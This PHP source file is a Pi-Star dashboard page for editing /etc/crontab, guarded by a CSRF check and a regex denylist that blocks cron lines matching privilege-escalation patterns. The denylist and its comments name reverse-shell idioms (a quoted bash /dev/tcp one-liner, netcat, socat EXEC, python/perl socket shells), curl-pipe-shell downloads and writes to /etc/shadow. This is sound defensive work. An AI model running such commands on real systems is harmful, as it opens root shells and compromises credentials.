<?php
/**
 * Raw text editor for /etc/crontab.
 *
 * Drops the parse_ini_file dance — the file is a plain text crontab,
 * not an INI. POST data lands in a textarea, gets staged to
 * /tmp/<obfuscated>.tmp, then sudo-copied back into /etc/crontab.
 * No daemon restart (cron rereads its config automatically).
 *
 * Operator can edit any cron line, including the pistar-* timer hooks
 * — read carefully before saving.
 */
require_once($_SERVER['DOCUMENT_ROOT'].'/config/security_headers.php');
require_once($_SERVER['DOCUMENT_ROOT'].'/config/csrf.php');
require_once($_SERVER['DOCUMENT_ROOT'].'/config/banner_warnings.inc');
setSecurityHeaders();

// CSRF protection — see config/csrf.php for the full rationale.
// Must run BEFORE any output: bootstraps the session on GET (so
// Set-Cookie ships) and rejects forged POSTs cleanly with 403
// before any state change (sed-i, fopen+fwrite, sudo cp, etc.).
csrf_verify();

// Layer 2 of the default-password protection — see config/banner_warnings.inc.
// MUST run BEFORE any output so header('Location: ...') works.
pistar_warnings_enforce_redirect();

// Load the language support
require_once('../config/language.php');
//Load the Pi-Star Release file
$pistarReleaseConfig = '/etc/pistar-release';
$configPistarRelease = array();
$configPistarRelease = parse_ini_file($pistarReleaseConfig, true);
//Load the Version Info
require_once('../config/version.php');
?>
  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
  <html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" lang="en">
  <head>
    <meta name="robots" content="index" />
    <meta name="robots" content="follow" />
    <meta name="language" content="English" />
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <meta name="Author" content="Andrew Taylor (MW0MWZ)" />
    <meta name="Description" content="Pi-Star Expert Editor" />
    <meta name="KeyWords" content="Pi-Star" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="pragma" content="no-cache" />
<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <meta http-equiv="Expires" content="0" />
    <title>Pi-Star - Digital Voice Dashboard - Expert Editor</title>
    <link rel="stylesheet" type="text/css" href="../css/pistar-css.php" />
  </head>
  <body>
  <?php pistar_warnings_render(); ?>
  <div class="container">
  <?php include './header-menu.inc'; ?>
  <div class="contentwide">
  <?php
/**
 * Cron-content denylist scanner.
 *
 * The dashboard sits behind HTTP basic auth. An operator (or anyone
 * with the basic-auth credential) can edit /etc/crontab through this
 * page. Cron runs lines as root, so a malicious cron entry is a
 * direct privilege escalation off whatever access the dashboard
 * already grants.
 *
 * This is BASIC HARDENING — not airtight. A determined attacker can
 * bypass any pattern matcher. Acknowledged accepted bypasses:
 *
 *   - base64 / hex obfuscation: `echo cGFzc3dk | base64 -d | sh`
 *     decodes to `passwd` at runtime; we don't decode before scanning.
 *   - Variable indirection: `* * * * * root $X user` where $X is
 *     defined in a sourced file.
 *   - External script paths: a benign-looking `/opt/myapp/run.sh`
 *     can do anything; we scan the cron line, not the script.
 *   - Brace expansion: `/usr/bin/{passwd,sh}` produces `passwd`
 *     after shell expansion but our `\b` boundary doesn't trip on
 *     the literal `passwd,` substring.
 *
 * The goal is to catch the obvious-bad patterns described in the
 * threat brief: password mutation, direct writes to /etc/shadow /
 * /etc/passwd / .htpasswd, and the standard shell-listener /
 * reverse-shell idioms (nc, socat exec, /dev/tcp redirects,
 * download-pipe-shell, python/perl one-liner shells).
 *
 * Comment lines (starting with `#`) and blank lines are exempt.
 * Cron variable assignments (PATH=, MAILTO=, SHELL=) are scanned
 * the same as commands — the rules below tolerate the false-positive
 * surface for the safety win. Known accepted false positive in the
 * wild: `MAILTO=passwd@example.com` triggers the password-command
 * rule. Operators with that exact email can use a different alias
 * or edit /etc/crontab via SSH to bypass the dashboard guard.
 *
 * Returns an array of human-readable diagnostics, one per problem
 * line. Empty array means OK to save.
 *
 * @param string $content Raw POSTed cron content (already \r-stripped
 *                        and decoded back to bytes by the browser).
 * @return array<int,string>
 */
function pistar_cron_validate($content)
{
    $rules = array(
        // Password modification commands. The leading character class
        // matches start-of-line OR a typical token boundary (whitespace,
        // path separator, shell metas, or `=` so we catch X=passwd).
        // \b at the end stops "passwords" / "chpasswdtest" matching.
        '#(?:^|[\s/;|&`$()=])(passwd|chpasswd|htpasswd)\b#i'
            => 'invokes a password-modification command (passwd / chpasswd / htpasswd)',
        // usermod -p sets a password hash directly, no PAM, no audit.
        '#\busermod\b[^\n]*\s-p\b#i'
            => 'usermod -p sets a password hash directly',
        // Reference to any auth file. Even reading these from cron is
        // unusual; writing is highly suspicious. Catches /etc/shadow,
        // /etc/passwd, /etc/passwd-, and any .htpasswd path including
        // /var/www/.htpasswd.
        '#(/etc/shadow|/etc/passwd|\.htpasswd)\b#i'
            => 'references an authentication file path',
        // Netcat — block any invocation. Operators with a legitimate
        // use should script it outside cron. Blocking outright is
        // simpler than disambiguating safe vs. unsafe nc flags.
        '#(?:^|[\s/;|&`$()=])(nc|ncat|netcat)\b#i'
            => 'invokes nc / ncat / netcat',
        // socat with EXEC: or SYSTEM: targets — process-spawning.
        '#\bsocat\b[^\n]*\b(EXEC|SYSTEM):#i'
            => 'socat with EXEC/SYSTEM token (spawns a process)',
        // Bash builtin /dev/tcp / /dev/udp redirect — classic reverse-
        // shell idiom (`bash -i >& /dev/tcp/h/p 0>&1`). No legitimate
        // cron use.
        '#/dev/(?:tcp|udp)/#'
            => 'reads or writes /dev/tcp/* or /dev/udp/* (reverse-shell pattern)',
        // Download-pipe-shell. Catches `curl ... | sh`, `wget ... | bash`,
        // etc. The `[^|\n]*` between the fetch tool and the pipe stops
        // a stray pipe later in a long line giving false positives.
        '#\b(curl|wget|fetch)\b[^|\n]*\|\s*(?:bash|sh|zsh|ksh|dash|exec)\b#i'
            => 'pipes downloaded content directly into a shell',
        // python reverse-shell one-liners — heuristic on imports/calls
        // commonly used in the published payloads.
        '#\bpython[23]?\b[^\n]*-c[^\n]*(?:socket\.socket|os\.dup2)#i'
            => 'python reverse-shell pattern',
        // perl reverse-shell one-liner — `perl -e \'use Socket; ...\'`
        '#\bperl\b[^\n]*-e[^\n]*\bSocket\b#i'
            => 'perl reverse-shell pattern',
    );

    $blockers = array();
    $lines = explode("\n", $content);
    foreach ($lines as $i => $line) {
        $trimmed = ltrim($line);
        if ($trimmed === '' || $trimmed[0] === '#') {
            continue;
        }
        foreach ($rules as $pattern => $reason) {
            if (preg_match($pattern, $line)) {
                $blockers[] = sprintf(
                    'line %d (%s): %s',
                    $i + 1,
                    $reason,
                    substr(trim($line), 0, 100)
                );
                break;  // one diagnostic per line is enough
            }
        }
    }
    return $blockers;
}

$cronBlockers = array();
if(isset($_POST['data'])) {
        // Normalise CRLF → LF before validation so a Windows browser's
        // submission scans byte-identical to the on-disk form.
        $rawData = str_replace("\r", "", (string)$_POST['data']);
        $cronBlockers = pistar_cron_validate($rawData);

        if (!empty($cronBlockers)) {
                // Validation failed — DO NOT touch /etc/crontab. Surface
                // the diagnostics in the page and re-render the form
                // with the operator's submitted content so they can
                // fix in place without retyping.
                $theData = $rawData;
                error_log('Pi-Star fulledit_cron.php: rejected save with '
                        . count($cronBlockers) . ' blocked line(s)');
        } else {
                // File Wrangling
                exec('sudo cp /etc/crontab /tmp/a8h4d8n3c83h4.tmp');
                exec('sudo chown www-data:www-data /tmp/a8h4d8n3c83h4.tmp');
                exec('sudo chmod 664 /tmp/a8h4d8n3c83h4.tmp');

                // Open the file and write the data
                $filepath = '/tmp/a8h4d8n3c83h4.tmp';
                $fh = fopen($filepath, 'w');
                fwrite($fh, $rawData);
                fclose($fh);
                exec('sudo mount -o remount,rw /');
                exec('sudo cp /tmp/a8h4d8n3c83h4.tmp /etc/crontab');
                exec('sudo chmod 644 /etc/crontab');
                exec('sudo chown root:root /etc/crontab');
                exec('sudo mount -o remount,ro /');

                // Re-open the file and read it
                $fh = fopen($filepath, 'r');
                $theData = fread($fh, filesize($filepath));
                fclose($fh);
        }
} else {
        // File Wrangling
        exec('sudo cp /etc/crontab /tmp/a8h4d8n3c83h4.tmp');
        exec('sudo chown www-data:www-data /tmp/a8h4d8n3c83h4.tmp');
        exec('sudo chmod 664 /tmp/a8h4d8n3c83h4.tmp');

        // Open the file and read it
        $filepath = '/tmp/a8h4d8n3c83h4.tmp';
        $fh = fopen($filepath, 'r');
        $theData = fread($fh, filesize($filepath));
        fclose($fh);
}

?>
<?php if (!empty($cronBlockers)) { ?>
<div style="background-color: #ff9090; color: #f01010; padding: 10px; margin: 0 0 10px 0;">
<b>Save rejected &mdash; the cron editor blocks lines that match common privilege-escalation patterns.</b>
<ul style="margin: 8px 0 0 16px;">
<?php foreach ($cronBlockers as $b) {
        echo '<li>' . htmlspecialchars($b, ENT_QUOTES, 'UTF-8') . "</li>\n";
} ?>
</ul>
<p style="margin: 8px 0 0 0;">Edit the offending line(s) and re-submit, or revert your changes.
If you have a legitimate need to schedule one of these patterns, use SSH and edit
<code>/etc/crontab</code> directly &mdash; the dashboard editor enforces these checks
to limit the damage of stolen dashboard credentials.</p>
</div>
<?php } ?>
<form name="test" method="post" action="">
<?php csrf_field(); ?>
<textarea name="data" cols="80" rows="45"><?php echo htmlspecialchars((string)$theData, ENT_QUOTES, 'UTF-8'); ?></textarea><br />
<input type="submit" name="submit" value="<?php echo $lang['apply']; ?>" />
</form>

</div>

<div class="footer">
Pi-Star / Pi-Star Dashboard, &copy; Andy Taylor (MW0MWZ) 2014-<?php echo date("Y"); ?>.<br />
Need help? Click <a style="color: #ffffff;" href="https://www.facebook.com/groups/pistarusergroup/" target="_new">here for the Support Group</a><br />
Get your copy of Pi-Star from <a style="color: #ffffff;" href="http://www.pistar.uk/downloads/" target="_new">here</a>.<br />
</div>

</div>
</body>
</html>

